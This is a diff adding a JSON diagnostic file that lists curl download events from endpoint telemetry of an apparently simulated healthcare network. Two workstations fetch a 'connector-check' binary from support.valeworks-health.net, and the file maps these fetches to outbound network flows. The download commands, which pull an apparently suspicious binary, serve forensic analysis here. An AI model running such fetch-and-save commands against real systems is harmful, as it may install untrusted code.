@@ -1,0 +1,80 @@
+{
+  "scope": "Positive visible CLI output/file/socket ownership; missing flows alone do not imply a contradiction. CLI destination extraction in this diagnostic uses the final visible URL and is not an engine parser.",
+  "downloads": [
+    {
+      "source": "WEB-EXT-01.meridianhcs.local/ecar.json",
+      "sha256": "4916df8a39889d47e19545cdb7fe4cc548f705e79827e9734a41bb57deec0017",
+      "create_line": 2649,
+      "pid": 3056914,
+      "command": "curl -s -o /dev/null -w '%{http_code}' http://localhost",
+      "destination": "http://localhost",
+      "files": [],
+      "same_pid_flows": [],
+      "other_pid_flows_same_destination_nearby": []
+    },
+    {
+      "source": "WS-LNGUYEN-01.meridianhcs.local/ecar.json",
+      "sha256": "6015ef66d121448d68ddd25edcee74830d76ac7b464ba67d587d10e367054afe",
+      "create_line": 251,
+      "pid": 3250060,
+      "command": "/usr/bin/curl -fsS -o /tmp/connector-check https://support.valeworks-health.net/tools/linux-x64/connector-check",
+      "destination": "https://support.valeworks-health.net/tools/linux-x64/connector-check",
+      "files": [
+        {
+          "line": 252,
+          "pid": 3250060,
+          "path": "/tmp/connector-check"
+        }
+      ],
+      "same_pid_flows": [
+        {
+          "line": 253,
+          "pid": 3250060,
+          "tuple": {
+            "command_line": "/usr/bin/curl -fsS -o /tmp/connector-check https://support.valeworks-health.net/tools/linux-x64/connector-check",
+            "image_path": "/usr/bin/curl",
+            "src_ip": "10.10.1.21",
+            "src_port": "38169",
+            "dst_ip": "10.10.3.20",
+            "dst_port": "8080",
+            "protocol": "tcp",
+            "direction": "OUTBOUND"
+          }
+        }
+      ],
+      "other_pid_flows_same_destination_nearby": []
+    },
+    {
+      "source": "WS-MCHEN-01.meridianhcs.local/ecar.json",
+      "sha256": "cd042b69214428d4e3933d71638bd972d8bbbc1416d157d38b047fa23facb1b9",
+      "create_line": 259,
+      "pid": 7248,
+      "command": "curl.exe -fsS -o C:\\Users\\marcus.chen\\Downloads\\connector-check.exe https://support.valeworks-health.net/tools/windows-x64/connector-check.exe",
+      "destination": "https://support.valeworks-health.net/tools/windows-x64/connector-check.exe",
+      "files": [
+        {
+          "line": 268,
+          "pid": 7248,
+          "path": "C:\\Users\\marcus.chen\\Downloads\\connector-check.exe"
+        }
+      ],
+      "same_pid_flows": [
+        {
+          "line": 269,
+          "pid": 7248,
+          "tuple": {
+            "command_line": "curl.exe -fsS -o C:\\Users\\marcus.chen\\Downloads\\connector-check.exe https://support.valeworks-health.net/tools/windows-x64/connector-check.exe",
+            "image_path": "C:\\Windows\\System32\\curl.exe",
+            "src_ip": "10.10.1.31",
+            "src_port": "58274",
+            "dst_ip": "10.10.3.20",
+            "dst_port": "8080",
+            "protocol": "tcp",
+            "direction": "OUTBOUND"
+          }
+        }
+      ],
+      "other_pid_flows_same_destination_nearby": []
+    }
+  ]
+}
